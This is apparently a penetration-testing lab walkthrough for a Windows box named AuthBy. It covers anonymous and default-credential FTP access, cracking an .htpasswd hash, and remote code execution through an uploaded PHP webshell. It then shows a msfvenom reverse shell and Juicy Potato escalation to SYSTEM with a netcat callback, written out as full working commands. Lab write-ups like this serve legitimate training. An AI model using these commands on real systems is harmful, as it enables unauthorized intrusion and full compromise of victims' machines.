# AuthBy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.160.46
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 14:56 +08
Nmap scan report for 192.168.160.46
Host is up (0.17s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server
```

I didn't didn't recognise prot 242 and 3145, so I ran a detailed scan on them.

```
$ sudo nmap -p 242,3145 -sC -sV --min-rate 3000 192.168.160.46     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 14:57 +08
Nmap scan report for 192.168.160.46
Host is up (0.17s latency).

PORT     STATE SERVICE    VERSION
242/tcp  open  http       Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin zFTPServer admin
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### FTP Anonymous Access --> .htpasswd

The FTP service on port 21 accepts anonymous logins:

```
$ ftp 192.168.160.46 
Connected to 192.168.160.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.160.46:kali): anonymous
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2048|)
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Jul 13 13:56 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Feb 18 01:19 accounts
```

The `accounts` folder is the most interesting:

```
ftp> cd accounts
250 CWD Command successful.
ftp> ls
229 Entering Extended Passive Mode (|||2049|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Feb 18 01:19 backup
----------   1 root     root          764 Feb 18 01:19 acc[Offsec].uac
----------   1 root     root         1030 Feb 18 01:19 acc[anonymous].uac
----------   1 root     root          926 Feb 18 01:19 acc[admin].ua
```

We cannot download these files, but now we know there's also an `admin` and `offsec` user. I tried re-logging in using `admin:admin`, and it worked:

```
$ ftp 192.168.160.46
Connected to 192.168.160.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.160.46:kali): admin
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
lftp> ls
229 Entering Extended Passive Mode (|||2051|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
```

We can crack the hash within `.htpasswd`:

```
$ john --show hash                                     
offsec:elite

1 password hash cracked, 0 left
```

We can then login to the web application hosted on port 242:

<figure><img src="../../../.gitbook/assets/image (2248).png" alt=""><figcaption></figcaption></figure>

### RCE

I put a `cmd.php` file in the `admin` FTP folder, and it worked in getting RCE:

<figure><img src="../../../.gitbook/assets/image (3161).png" alt=""><figcaption></figcaption></figure>

The machine didn't have `powershell`, so I generated a reverse shell payload:

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=4444 -f exe > rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Placed it within the FTP server and executed it using my webshell:

```
$ curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -G --data-urlencode 'cmd=.\rev.exe' http://192.168.160.46:242/cmd.php
```

<figure><img src="../../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SeImpersoantePrivilege --> Potato

This user had the `SeImpersonatePrivilege` enabled:

```
C:\wamp\www>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I tried transferring x64 binaries over, but they didn't work, indicating that the machine was x86. As such, I transferred `juicypotatox86.exe` and `nc32.exe` over to exploit this. We can dowload files using `certutil`.

```
C:\Windows\Tasks>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Windows\Tasks

07/13/2023  12:08 AM    <DIR>          .
07/13/2023  12:08 AM    <DIR>          ..
07/13/2023  12:07 AM           263,680 juicypotatox86.exe
07/13/2023  12:07 AM            38,616 nc.exe
07/09/2020  11:07 AM            21,360 SCHEDLGU.TXT
```

We can then run `nc.exe` as the SYSTEM user using Juicy Potato:

{% code overflow="wrap" %}
```
.\juicypotatox86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.191 4444" -t *
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
